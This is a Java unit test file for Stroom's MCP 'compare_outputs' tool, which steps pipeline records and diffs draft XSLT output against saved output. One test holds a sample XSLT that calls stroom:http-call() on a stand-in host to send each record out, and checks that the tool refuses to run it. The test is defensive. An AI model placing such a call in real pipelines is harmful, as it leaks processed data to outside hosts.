/*
 * Copyright 2026 Crown Copyright
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package stroom.mcp.impl.tools;

import stroom.ai.impl.tools.ToolResult;
import stroom.docref.DocRef;
import stroom.pipeline.shared.XsltDoc;
import stroom.pipeline.shared.stepping.StepLocation;
import stroom.pipeline.shared.stepping.SteppingResult;
import stroom.util.json.JsonUtil;

import org.junit.jupiter.api.Test;
import org.mockito.Mockito;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.function.BiFunction;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;

/// compare_outputs, and the stepping of records spread over streams it is made of (the Stroom MCP server's
/// `tests/test_stepping.py` and `tests/test_progress.py`, their step_spread cases).
class TestCompareOutputsTool {

    private final SteppingWorld world = new SteppingWorld();
    private final EventLocations eventLocations = Mockito.mock(EventLocations.class);

    @Test
    void recordsAreSteppedSpreadOverTheStreams() {
        // Seen in production: 200 records stepped from one stream took 132 s of write_documentation, each step
        // dearer the further in it was (Stroom reads the stream from its start). An even share from each stream, a
        // short stream's leftover taken from the others, in stream order.
        final Map<Long, Integer> sizes = Map.of(1L, 300, 2L, 10, 3L, 300, 4L, 300, 5L, 300);
        world.stepper = (stream, at) -> at.getRecordIndex() < sizes.get(stream)
                ? SteppingWorld.step(stream, 0, at.getRecordIndex(), stream + ":" + at.getRecordIndex())
                : null;

        final PipelineStepping.Spread spread = world.stepping().stepSpread(world.context(),
                world.stepping().load(SteppingWorld.UUID), List.of(1L, 2L, 3L, 4L, 5L), null, 200);

        final List<Long> taken = spread.steps().stream().map(PipelineStepping.Spread.Step::streamId).toList();
        // Stream order, then record order.
        assertThat(taken).hasSize(200).isSorted();
        assertThat(taken.stream().filter(id -> id == 2L).count()).isEqualTo(10);
        // Its share, then the leftover spread.
        for (final long id : List.of(1L, 3L, 4L, 5L)) {
            assertThat(taken.stream().filter(stream -> stream == id).count()).isGreaterThanOrEqualTo(40);
        }
        // Never deep in one stream.
        assertThat(spread.steps()).allMatch(step -> step.location().getRecordIndex() < 60);
        assertThat(spread.stopped()).isFalse();
        // Each share is walked in a session of its own, and each is ended.
        world.walks.forEach(walk -> Mockito.verify(walk).close());

        final PipelineStepping.Outputs outputs = world.stepping().outputs(world.context(),
                world.stepping().load(SteppingWorld.UUID), List.of(2L), "translationFilter", null, 5);
        assertThat(outputs.outputs().values()).containsExactly("2:0", "2:1", "2:2", "2:3", "2:4");
    }

    @Test
    void steppingASpreadOfRecordsSaysSoOnceAndThenNowAndThen() {
        // Seen: 200 records stepped for write_documentation in 132 s, with nothing shown.
        world.records(30, "x");

        final PipelineStepping.Spread spread = world.stepping().stepSpread(world.context(),
                world.stepping().load(SteppingWorld.UUID), List.of(1L, 2L), null, 40);

        assertThat(spread.steps()).hasSize(40);
        // Each step is quick here, so nothing more is said.
        assertThat(world.said).containsExactly("Stepping up to 40 records of 2 streams through ACME");
    }

    @Test
    void theSameRecordsAreDiffedFieldByField() {
        world.stepper = (stream, at) -> at.getRecordIndex() < 2
                ? SteppingWorld.step(stream, 0, at.getRecordIndex(), "<Events><Event><User>u"
                                                                     + at.getRecordIndex() + "</User></Event></Events>")
                : null;
        final Map<String, String> draft = Map.of("translationFilter", "<xsl:stylesheet/>");
        world.stepper = withDraft(world.stepper);

        final Map<String, Object> result = compare("{\"pipeline_uuid\": \"p-1\", \"stream_ids\": [7], "
                                                   + "\"draft_code\": {\"translationFilter\": \"<xsl:stylesheet/>\"}}");

        assertThat(world.opened).extracting(Map.Entry::getValue).containsExactly(Map.of(), draft);
        assertThat(result.get("records_compared")).isEqualTo(2);
        assertThat(result.get("records_changed")).isEqualTo(1);
        assertThat(result.get("element")).isEqualTo("translationFilter");
        assertThat(result.get("unchanged")).isEqualTo(false);
        final Map<String, Object> example = new LinkedHashMap<>();
        example.put("record", "7:1");
        example.put("before", List.of("u1"));
        example.put("after", List.of("changed"));
        final Map<String, Object> field = new LinkedHashMap<>();
        field.put("path", "Event/User");
        field.put("added", 0);
        field.put("removed", 0);
        field.put("changed", 1);
        field.put("example", example);
        assertThat(result.get("fields_changed")).isEqualTo(List.of(field));
    }

    @Test
    void aDraftThatReachesOutsideStroomIsNotSteppedUnlessTheSavedXsltDoesToo() {
        // Before, compare_outputs stepped any draft, which runs with Stroom's access as processing would: e.g.
        // stroom:http-call() sending each record to a URL.
        final String calls = "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"3.0\" "
                             + "xmlns:stroom=\"stroom\"><xsl:template match=\"/\"><xsl:value-of select=\""
                             + "stroom:http-call('https://x.example.com', '', 'text/plain', string(.), '')\"/>"
                             + "</xsl:template></xsl:stylesheet>";
        final String json = "{\"pipeline_uuid\": \"p-1\", \"stream_ids\": [7], \"draft_code\": {\"translationFilter\": "
                            + JsonUtil.writeValueAsString(calls) + "}}";

        assertThat(refused(json)).startsWith("draft_code['translationFilter'] is not stepped: ")
                .contains("calls stroom:http-call(), which reaches outside Stroom");
        assertThat(world.opened).isEmpty();

        // The element's saved XSLT calls it already (the user put it there): stepped.
        Mockito.when(world.documentAccess.read(any(DocRef.class), Mockito.eq(XsltDoc.class)))
                .thenReturn(Optional.of(XsltDoc.builder().uuid("x").name("ACME").data(calls).build()));
        world.stepping().refuseUnsafeDrafts("p-1", Map.of("translationFilter", calls));
    }

    @Test
    void somethingToCompareAgainstAndSomethingToCompareAreNeeded() {
        assertThat(refused("{\"pipeline_uuid\": \"p-1\", \"stream_ids\": [7]}"))
                .isEqualTo("Give draft_code or other_pipeline_uuid to compare against");
        assertThat(refused("{\"pipeline_uuid\": \"p-1\", \"draft_code\": {\"translationFilter\": \"x\"}}"))
                .isEqualTo("Give stream_ids, or events (from search_events with an index), whose records to compare");
        assertThat(refused("{\"pipeline_uuid\": \"p-1\", \"stream_ids\": [7], \"other_pipeline_uuid\": \"p-1\", "
                           + "\"max_records\": 501}"))
                .isEqualTo("max_records must be a whole number from 1 to 500, not '501'");
    }

    @Test
    void locatedEventsRecordsAreComparedExactly() {
        // Asked for by the user: a fix proven on what a search found.
        final Map<String, Object> located = new LinkedHashMap<>();
        located.put("stream_id", 8L);
        located.put("event_id", 3L);
        located.put("raw", 6L);
        located.put("part", 0L);
        located.put("record", 12L);
        Mockito.when(eventLocations.eventLocations(any())).thenReturn(List.of(located));
        world.records(20, "<Events><Event><User>u</User></Event></Events>");

        final Map<String, Object> result = compare("{\"pipeline_uuid\": \"p-1\", \"other_pipeline_uuid\": \"p-1\", "
                                                   + "\"events\": [{\"stream_id\": 8, \"event_id\": 3}]}");

        Mockito.verify(eventLocations).eventLocations(List.of(new EventLocations.EventRef(8, 3)));
        assertThat(world.steps).containsExactly("REFRESH 0:12", "REFRESH 0:12");
        assertThat(result.get("records_compared")).isEqualTo(1);
        assertThat(result.get("unchanged")).isEqualTo(true);
    }

    @Test
    void recordsAlreadyLocatedAreComparedWithoutLocatingThemAgain() {
        // summarise_fix locates the events once, for the comparison and the steps.
        final Map<String, Object> located = new LinkedHashMap<>();
        located.put("raw", 6L);
        located.put("part", 0L);
        located.put("record", 12L);
        world.records(20, "<Events><Event><User>u</User></Event></Events>");
        final CompareOutputsTool.Request request = new CompareOutputsTool.Request("p-1", List.of(), null, "p-1",
                null, CompareOutputsTool.DEFAULT_MAX_RECORDS, List.of());

        final Map<String, Object> result = tool().compareLocated(world.context(), request, List.of(located));

        Mockito.verifyNoInteractions(eventLocations);
        assertThat(world.steps).containsExactly("REFRESH 0:12", "REFRESH 0:12");
        assertThat(result.get("records_compared")).isEqualTo(1);
        assertThat(result.get("unchanged")).isEqualTo(true);
    }

    // A stepper whose record 1 says otherwise for draft code: the walks opened with code are the draft's.
    private BiFunction<Long, StepLocation, SteppingResult> withDraft(
            final BiFunction<Long, StepLocation, SteppingResult> saved) {
        return (stream, at) -> {
            final boolean draft = !world.opened.getLast().getValue().isEmpty();
            if (draft && at.getRecordIndex() == 1) {
                return SteppingWorld.step(stream, 0, 1, "<Events><Event><User>changed</User></Event></Events>");
            }
            return saved.apply(stream, at);
        };
    }

    private Map<String, Object> compare(final String arguments) {
        final ToolResult result = tool().execute(PortedToolCalls.call(CompareOutputsTool.NAME, arguments),
                world.context());
        assertThat(result.isError()).as(result.text()).isFalse();
        return PortedToolCalls.json(result.text());
    }

    private String refused(final String arguments) {
        final ToolResult result = tool().execute(PortedToolCalls.call(CompareOutputsTool.NAME, arguments),
                world.context());
        assertThat(result.isError()).isTrue();
        return result.text();
    }

    private CompareOutputsTool tool() {
        return new CompareOutputsTool(world.stepping(), eventLocations);
    }
}
